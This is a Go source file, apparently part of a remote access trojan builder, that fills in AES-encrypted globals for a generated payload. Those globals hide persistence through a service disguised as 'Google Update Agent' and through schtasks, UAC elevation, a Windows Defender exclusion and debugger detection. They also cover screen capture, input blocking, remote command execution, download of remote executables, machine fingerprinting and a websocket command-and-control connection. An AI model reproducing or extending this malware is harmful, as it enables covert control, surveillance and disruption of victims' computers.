package buildergen

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"strings"
)

type globalValues struct {
	ForceAdmin          string
	AutorunMode         string
	HideFilesEnabled    bool
	InstallMode         string
	CustomInstallPath   string
	EncServerHost       string
	EncBuilderToken     string
	EncMutexName        string
	EncServiceName      string
	EncDisplayName      string
	EncServiceExeName   string
	EncWorkerExeName    string
	EncSchtasksExe      string
	EncProgramDataEnv   string
	EncWindowsUpdateDir string
	EncAppDataEnv       string
	EncMicrosoftDir     string
	EncWindowsDir       string
	EncAdvapi32Dll      string
	EncKernel32Dll      string
	EncOpenSCManagerW   string
	EncCreateServiceW   string
	EncCloseServiceHandle string
	EncOpenServiceW     string
	EncStartServiceW    string
	EncOpenProcessToken string
	EncGetTokenInformation string
	EncCloseHandle      string
	EncPowerShellExe    string
	EncPsStartProcessPrefix string
	EncPsRunasSuffix    string
	EncAddMpPref        string
	EncIsDebuggerPresent string
	EncWsScheme         string
	EncWsPath           string
	EncBuilderTokenHeader string
	EncOwnerName        string
	EncBuildID          string
	EncCmdPrefix        string
	EncBgPrefix         string
	EncCmdExe           string
	EncCmdCArg          string
	EncMsgBoxPrefix     string
	EncSwapMouseLeft    string
	EncSwapMouseRight   string
	EncShutdownExe      string
	EncShutdownRestart  string
	EncShutdownPoweroff string
	EncShutdownTimeout  string
	EncShutdownZero     string
	EncShakeOn          string
	EncShakeOff         string
	EncUser32Dll        string
	EncGetForegroundWindow string
	EncGetWindowTextW   string
	EncGetWindowTextLengthW string
	EncUnknownWindow    string
	EncNoActiveWindow   string
	EncUntitledWindow   string
	EncSystemParametersInfoW string
	EncBlockInputName   string
	EncMessageBoxW      string
	EncSetCursorPos     string
	EncBlockInputOnCmd  string
	EncBlockInputOffCmd string
	EncGetConsoleWindow string
	EncShowWindow       string
	EncGdi32Dll         string
	EncGetDesktopWindow string
	EncGetDC            string
	EncCreateCompatibleDC string
	EncCreateCompatibleBitmap string
	EncSelectObject     string
	EncBitBlt           string
	EncGetDeviceCaps    string
	EncDeleteDC         string
	EncReleaseDC        string
	EncDeleteObject     string
	EncGetDIBits        string
	EncHttpPrefix       string
	EncHttpsPrefix      string
	EncHttpsScheme      string
	EncSchemeSep        string
	EncBgImageName      string
	EncRemotePrefix     string
	EncExeSuffix        string
	EncCmdStart         string
	EncIpifyURL         string
	EncIpApiHost        string
	EncIpApiPath        string
	EncIpApiQuery       string
	EncCountryFallback  string
	EncWmic             string
	EncPsGetCpu         string
	EncWmicGetCpu       string
	EncPsGetGpu         string
	EncWmicGetGpu       string
	EncPsGetRam         string
	EncWmicGetRam       string
	EncPsGetOs          string
	EncWmicGetOs        string
	EncGetSystemPowerStatus string
	EncLinuxCpuCmd      string
	EncDarwinCpuCmd     string
	EncUnknownCPU       string
	EncUnknownGPU       string
	EncUnknownRAM       string
	EncUnknownOS        string
	EncLaptopLabel      string
	EncDesktopLabel     string
	EncShCmd            string
	EncDashCArg         string
	EncSysctlCmd        string
	EncSysctlNameArg    string
	EncXdgOpen          string
	XorKeyLiteral       string
}

func buildGlobals(cfg Config) (globalValues, error) {
	safeBuildID := strings.TrimSpace(cfg.BuildID)
	safeBuildID = sanitizeBuildID(safeBuildID)
	key := generateXorKey()

	svcName := "GoogleUpdateAgent"
	displayName := "Google Update Agent"
	svcExeName := "GoogleUpdate.exe"
	workerExeName := "Google Chrome.exe"
	mutexName := fmt.Sprintf("Global\\\\NvDisplayMutex_%s", safeBuildID)

	encServerHost := aesEncrypt(cfg.ServerHost, key)
	encBuilderToken := aesEncrypt(cfg.BuilderToken, key)

	return globalValues{
		ForceAdmin:        strings.TrimSpace(cfg.ForceAdmin),
		AutorunMode:       strings.TrimSpace(cfg.AutorunMode),
		HideFilesEnabled:  cfg.HideFilesEnabled,
		InstallMode:       strings.TrimSpace(cfg.InstallMode),
		CustomInstallPath: escapeGoString(cfg.CustomInstallPath),
		EncServerHost:     encServerHost,
		EncBuilderToken:   encBuilderToken,
		EncMutexName:      aesEncrypt(mutexName, key),
		EncServiceName:    aesEncrypt(svcName, key),
		EncDisplayName:    aesEncrypt(displayName, key),
		EncServiceExeName: aesEncrypt(svcExeName, key),
		EncWorkerExeName:  aesEncrypt(workerExeName, key),
		EncSchtasksExe:    aesEncrypt("schtasks", key),
		EncProgramDataEnv: aesEncrypt("ProgramData", key),
		EncWindowsUpdateDir: aesEncrypt("GoogleUpdate", key),
		EncAppDataEnv:     aesEncrypt("APPDATA", key),
		EncMicrosoftDir:   aesEncrypt("Microsoft", key),
		EncWindowsDir:     aesEncrypt("Windows", key),
		EncAdvapi32Dll:    aesEncrypt("advapi32.dll", key),
		EncKernel32Dll:    aesEncrypt("kernel32.dll", key),
		EncOpenSCManagerW: aesEncrypt("OpenSCManagerW", key),
		EncCreateServiceW: aesEncrypt("CreateServiceW", key),
		EncCloseServiceHandle: aesEncrypt("CloseServiceHandle", key),
		EncOpenServiceW:   aesEncrypt("OpenServiceW", key),
		EncStartServiceW:  aesEncrypt("StartServiceW", key),
		EncOpenProcessToken: aesEncrypt("OpenProcessToken", key),
		EncGetTokenInformation: aesEncrypt("GetTokenInformation", key),
		EncCloseHandle:    aesEncrypt("CloseHandle", key),
		EncPowerShellExe:  aesEncrypt("powershell", key),
		EncPsStartProcessPrefix: aesEncrypt("Start-Process -FilePath '", key),
		EncPsRunasSuffix:  aesEncrypt("' -Verb runas", key),
		EncAddMpPref:      aesEncrypt("Add-MpPreference -ExclusionPath", key),
		EncIsDebuggerPresent: aesEncrypt("IsDebuggerPresent", key),
		EncWsScheme:       aesEncrypt(strings.TrimSpace(cfg.WSScheme), key),
		EncWsPath:         aesEncrypt("/ws", key),
		EncBuilderTokenHeader: aesEncrypt("X-Builder-Token", key),
		EncOwnerName:      aesEncrypt(strings.TrimSpace(cfg.Owner), key),
		EncBuildID:        aesEncrypt(strings.TrimSpace(cfg.BuildID), key),
		EncCmdPrefix:      aesEncrypt("cmd:", key),
		EncBgPrefix:       aesEncrypt("bg:", key),
		EncCmdExe:         aesEncrypt("cmd", key),
		EncCmdCArg:        aesEncrypt("/C", key),
		EncMsgBoxPrefix:   aesEncrypt("msgbox|", key),
		EncSwapMouseLeft:  aesEncrypt("swap_mouse_left_right", key),
		EncSwapMouseRight: aesEncrypt("swap_mouse_right_left", key),
		EncShutdownExe:    aesEncrypt("shutdown", key),
		EncShutdownRestart: aesEncrypt("/r", key),
		EncShutdownPoweroff: aesEncrypt("/s", key),
		EncShutdownTimeout: aesEncrypt("/t", key),
		EncShutdownZero:   aesEncrypt("0", key),
		EncShakeOn:        aesEncrypt("shake_on", key),
		EncShakeOff:       aesEncrypt("shake_off", key),
		EncUser32Dll:      aesEncrypt("user32.dll", key),
		EncGetForegroundWindow: aesEncrypt("GetForegroundWindow", key),
		EncGetWindowTextW: aesEncrypt("GetWindowTextW", key),
		EncGetWindowTextLengthW: aesEncrypt("GetWindowTextLengthW", key),
		EncUnknownWindow:  aesEncrypt("Unknown", key),
		EncNoActiveWindow: aesEncrypt("No active window", key),
		EncUntitledWindow: aesEncrypt("Untitled", key),
		EncSystemParametersInfoW: aesEncrypt("SystemParametersInfoW", key),
		EncBlockInputName: aesEncrypt("BlockInput", key),
		EncMessageBoxW:    aesEncrypt("MessageBoxW", key),
		EncSetCursorPos:   aesEncrypt("SetCursorPos", key),
		EncBlockInputOnCmd: aesEncrypt("block_input_on", key),
		EncBlockInputOffCmd: aesEncrypt("block_input_off", key),
		EncGetConsoleWindow: aesEncrypt("GetConsoleWindow", key),
		EncShowWindow:     aesEncrypt("ShowWindow", key),
		EncGdi32Dll:       aesEncrypt("gdi32.dll", key),
		EncGetDesktopWindow: aesEncrypt("GetDesktopWindow", key),
		EncGetDC:          aesEncrypt("GetDC", key),
		EncCreateCompatibleDC: aesEncrypt("CreateCompatibleDC", key),
		EncCreateCompatibleBitmap: aesEncrypt("CreateCompatibleBitmap", key),
		EncSelectObject:   aesEncrypt("SelectObject", key),
		EncBitBlt:         aesEncrypt("BitBlt", key),
		EncGetDeviceCaps:  aesEncrypt("GetDeviceCaps", key),
		EncDeleteDC:       aesEncrypt("DeleteDC", key),
		EncReleaseDC:      aesEncrypt("ReleaseDC", key),
		EncDeleteObject:   aesEncrypt("DeleteObject", key),
		EncGetDIBits:      aesEncrypt("GetDIBits", key),
		EncHttpPrefix:     aesEncrypt("http://", key),
		EncHttpsPrefix:    aesEncrypt("https://", key),
		EncHttpsScheme:    aesEncrypt("https", key),
		EncSchemeSep:      aesEncrypt("://", key),
		EncBgImageName:    aesEncrypt("bg_image.jpg", key),
		EncRemotePrefix:   aesEncrypt("/remote/", key),
		EncExeSuffix:      aesEncrypt(".exe", key),
		EncCmdStart:       aesEncrypt("start", key),
		EncIpifyURL:       aesEncrypt("https://api.ipify.org", key),
		EncIpApiHost:      aesEncrypt("ip-api.com", key),
		EncIpApiPath:      aesEncrypt("/json/", key),
		EncIpApiQuery:     aesEncrypt("?fields=countryCode", key),
		EncCountryFallback: aesEncrypt("RU", key),
		EncWmic:           aesEncrypt("wmic", key),
		EncPsGetCpu:       aesEncrypt("(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name) -join ','", key),
		EncWmicGetCpu:     aesEncrypt("cpu get name", key),
		EncPsGetGpu:       aesEncrypt("Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name", key),
		EncWmicGetGpu:     aesEncrypt("path win32_VideoController get name", key),
		EncPsGetRam:       aesEncrypt("(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum", key),
		EncWmicGetRam:     aesEncrypt("computersystem get TotalPhysicalMemory", key),
		EncPsGetOs:        aesEncrypt("(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').ProductName", key),
		EncWmicGetOs:      aesEncrypt("os get Caption", key),
		EncGetSystemPowerStatus: aesEncrypt("GetSystemPowerStatus", key),
		EncLinuxCpuCmd:    aesEncrypt("lscpu | grep 'Model name' | cut -d':' -f2 | xargs", key),
		EncDarwinCpuCmd:   aesEncrypt("machdep.cpu.brand_string", key),
		EncUnknownCPU:     aesEncrypt("Unknown CPU", key),
		EncUnknownGPU:     aesEncrypt("Unknown GPU", key),
		EncUnknownRAM:     aesEncrypt("Unknown RAM", key),
		EncUnknownOS:      aesEncrypt("Unknown OS", key),
		EncLaptopLabel:    aesEncrypt("laptop", key),
		EncDesktopLabel:   aesEncrypt("desktop", key),
		EncShCmd:          aesEncrypt("sh", key),
		EncDashCArg:       aesEncrypt("-c", key),
		EncSysctlCmd:      aesEncrypt("sysctl", key),
		EncSysctlNameArg:  aesEncrypt("-n", key),
		EncXdgOpen:        aesEncrypt("xdg-open", key),
		XorKeyLiteral:     escapeGoString(key),
	}, nil
}

func aesEncrypt(plaintext, key string) string {
	if plaintext == "" || key == "" {
		return ""
	}
	aesKey := make([]byte, 32)
	copy(aesKey, []byte(key))

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return plaintext
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return plaintext
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return plaintext
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

func templateGlobals(cfg Config) (string, error) {
	g, err := buildGlobals(cfg)
	if err != nil {
		return "", err
	}

	goHideFiles := "false"
	if g.HideFilesEnabled {
		goHideFiles = "true"
	}

	return strings.TrimSpace(fmt.Sprintf(`
var forceAdminMode = "%s"
var autorunMode = "%s"
var hideFilesEnabled = %s
var installMode = "%s"
var customInstallPath = "%s"

var encServerHost = []byte{%s}
var encServiceName = []byte{%s}
var encDisplayName = []byte{%s}
var encServiceExeName = []byte{%s}
var encWorkerExeName = []byte{%s}
var encMutexName = []byte{%s}
var encBuilderToken = []byte{%s}
var encSchtasksExe = []byte{%s}
var encProgramDataEnv = []byte{%s}
var encWindowsUpdateDir = []byte{%s}
var encAppDataEnv = []byte{%s}
var encMicrosoftDir = []byte{%s}
var encWindowsDir = []byte{%s}
var encAdvapi32Dll = []byte{%s}
var encKernel32Dll = []byte{%s}
var encOpenSCManagerWName = []byte{%s}
var encCreateServiceWName = []byte{%s}
var encCloseServiceHandleName = []byte{%s}
var encOpenServiceWName = []byte{%s}
var encStartServiceWName = []byte{%s}
var encOpenProcessTokenName = []byte{%s}
var encGetTokenInformationName = []byte{%s}
var encCloseHandleName = []byte{%s}
var encPowerShellExe = []byte{%s}
var encPsStartProcessPrefix = []byte{%s}
var encPsRunasSuffix = []byte{%s}
var encAddMpPref = []byte{%s}
var encIsDebuggerPresent = []byte{%s}
var encWsScheme = []byte{%s}
var encWsPath = []byte{%s}
var encBuilderTokenHeader = []byte{%s}
var encOwnerName = []byte{%s}
var encBuildID = []byte{%s}
var encCmdPrefix = []byte{%s}
var encBgPrefix = []byte{%s}
var encCmdExe = []byte{%s}
var encCmdCArg = []byte{%s}
var encMsgBoxPrefix = []byte{%s}
var encSwapMouseLeft = []byte{%s}
var encSwapMouseRight = []byte{%s}
var encShutdownExe = []byte{%s}
var encShutdownRestart = []byte{%s}
var encShutdownPoweroff = []byte{%s}
var encShutdownTimeout = []byte{%s}
var encShutdownZero = []byte{%s}
var encShakeOn = []byte{%s}
var encShakeOff = []byte{%s}
var encUser32Dll = []byte{%s}
var encGetForegroundWindowName = []byte{%s}
var encGetWindowTextWName = []byte{%s}
var encGetWindowTextLengthWName = []byte{%s}
var encUnknownWindow = []byte{%s}
var encNoActiveWindow = []byte{%s}
var encUntitledWindow = []byte{%s}
var encSystemParametersInfoWName = []byte{%s}
var encBlockInputName = []byte{%s}
var encMessageBoxWName = []byte{%s}
var encSetCursorPosName = []byte{%s}
var encBlockInputOnCmd = []byte{%s}
var encBlockInputOffCmd = []byte{%s}
var encGetConsoleWindowName = []byte{%s}
var encShowWindowName = []byte{%s}
var encGdi32Dll = []byte{%s}
var encGetDesktopWindowName = []byte{%s}
var encGetDCName = []byte{%s}
var encCreateCompatibleDCName = []byte{%s}
var encCreateCompatibleBitmapName = []byte{%s}
var encSelectObjectName = []byte{%s}
var encBitBltName = []byte{%s}
var encGetDeviceCapsName = []byte{%s}
var encDeleteDCName = []byte{%s}
var encReleaseDCName = []byte{%s}
var encDeleteObjectName = []byte{%s}
var encGetDIBitsName = []byte{%s}
var encHttpPrefix = []byte{%s}
var encHttpsPrefix = []byte{%s}
var encHttpsScheme = []byte{%s}
var encSchemeSep = []byte{%s}
var encBgImageName = []byte{%s}
var encRemotePrefix = []byte{%s}
var encExeSuffix = []byte{%s}
var encCmdStart = []byte{%s}
var encIpifyURL = []byte{%s}
var encIpApiHost = []byte{%s}
var encIpApiPath = []byte{%s}
var encIpApiQuery = []byte{%s}
var encCountryFallback = []byte{%s}
var encWmic = []byte{%s}
var encPsGetCpu = []byte{%s}
var encWmicGetCpu = []byte{%s}
var encPsGetGpu = []byte{%s}
var encWmicGetGpu = []byte{%s}
var encPsGetRam = []byte{%s}
var encWmicGetRam = []byte{%s}
var encPsGetOs = []byte{%s}
var encWmicGetOs = []byte{%s}
var encGetSystemPowerStatusName = []byte{%s}
var encLinuxCpuCmd = []byte{%s}
var encDarwinCpuCmd = []byte{%s}
var encUnknownCPU = []byte{%s}
var encUnknownGPU = []byte{%s}
var encUnknownRAM = []byte{%s}
var encUnknownOS = []byte{%s}
var encLaptopLabel = []byte{%s}
var encDesktopLabel = []byte{%s}
var encShCmd = []byte{%s}
var encDashCArg = []byte{%s}
var encSysctlCmd = []byte{%s}
var encSysctlNameArg = []byte{%s}
var encXdgOpen = []byte{%s}

var decryptionKey = []byte("%s")
`,
		escapeGoString(g.ForceAdmin),
		escapeGoString(g.AutorunMode),
		goHideFiles,
		escapeGoString(g.InstallMode),
		g.CustomInstallPath,
		g.EncServerHost,
		g.EncServiceName,
		g.EncDisplayName,
		g.EncServiceExeName,
		g.EncWorkerExeName,
		g.EncMutexName,
		g.EncBuilderToken,
		g.EncSchtasksExe,
		g.EncProgramDataEnv,
		g.EncWindowsUpdateDir,
		g.EncAppDataEnv,
		g.EncMicrosoftDir,
		g.EncWindowsDir,
		g.EncAdvapi32Dll,
		g.EncKernel32Dll,
		g.EncOpenSCManagerW,
		g.EncCreateServiceW,
		g.EncCloseServiceHandle,
		g.EncOpenServiceW,
		g.EncStartServiceW,
		g.EncOpenProcessToken,
		g.EncGetTokenInformation,
		g.EncCloseHandle,
		g.EncPowerShellExe,
		g.EncPsStartProcessPrefix,
		g.EncPsRunasSuffix,
		g.EncAddMpPref,
		g.EncIsDebuggerPresent,
		g.EncWsScheme,
		g.EncWsPath,
		g.EncBuilderTokenHeader,
		g.EncOwnerName,
		g.EncBuildID,
		g.EncCmdPrefix,
		g.EncBgPrefix,
		g.EncCmdExe,
		g.EncCmdCArg,
		g.EncMsgBoxPrefix,
		g.EncSwapMouseLeft,
		g.EncSwapMouseRight,
		g.EncShutdownExe,
		g.EncShutdownRestart,
		g.EncShutdownPoweroff,
		g.EncShutdownTimeout,
		g.EncShutdownZero,
		g.EncShakeOn,
		g.EncShakeOff,
		g.EncUser32Dll,
		g.EncGetForegroundWindow,
		g.EncGetWindowTextW,
		g.EncGetWindowTextLengthW,
		g.EncUnknownWindow,
		g.EncNoActiveWindow,
		g.EncUntitledWindow,
		g.EncSystemParametersInfoW,
		g.EncBlockInputName,
		g.EncMessageBoxW,
		g.EncSetCursorPos,
		g.EncBlockInputOnCmd,
		g.EncBlockInputOffCmd,
		g.EncGetConsoleWindow,
		g.EncShowWindow,
		g.EncGdi32Dll,
		g.EncGetDesktopWindow,
		g.EncGetDC,
		g.EncCreateCompatibleDC,
		g.EncCreateCompatibleBitmap,
		g.EncSelectObject,
		g.EncBitBlt,
		g.EncGetDeviceCaps,
		g.EncDeleteDC,
		g.EncReleaseDC,
		g.EncDeleteObject,
		g.EncGetDIBits,
		g.EncHttpPrefix,
		g.EncHttpsPrefix,
		g.EncHttpsScheme,
		g.EncSchemeSep,
		g.EncBgImageName,
		g.EncRemotePrefix,
		g.EncExeSuffix,
		g.EncCmdStart,
		g.EncIpifyURL,
		g.EncIpApiHost,
		g.EncIpApiPath,
		g.EncIpApiQuery,
		g.EncCountryFallback,
		g.EncWmic,
		g.EncPsGetCpu,
		g.EncWmicGetCpu,
		g.EncPsGetGpu,
		g.EncWmicGetGpu,
		g.EncPsGetRam,
		g.EncWmicGetRam,
		g.EncPsGetOs,
		g.EncWmicGetOs,
		g.EncGetSystemPowerStatus,
		g.EncLinuxCpuCmd,
		g.EncDarwinCpuCmd,
		g.EncUnknownCPU,
		g.EncUnknownGPU,
		g.EncUnknownRAM,
		g.EncUnknownOS,
		g.EncLaptopLabel,
		g.EncDesktopLabel,
		g.EncShCmd,
		g.EncDashCArg,
		g.EncSysctlCmd,
		g.EncSysctlNameArg,
		g.EncXdgOpen,
		g.XorKeyLiteral,
	)), nil
}

func sanitizeBuildID(buildID string) string {
	if buildID == "" {
		return ""
	}
	var out strings.Builder
	for i := 0; i < len(buildID) && out.Len() < 10; i++ {
		ch := buildID[i]
		if (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') {
			out.WriteByte(ch)
		}
	}
	return out.String()
}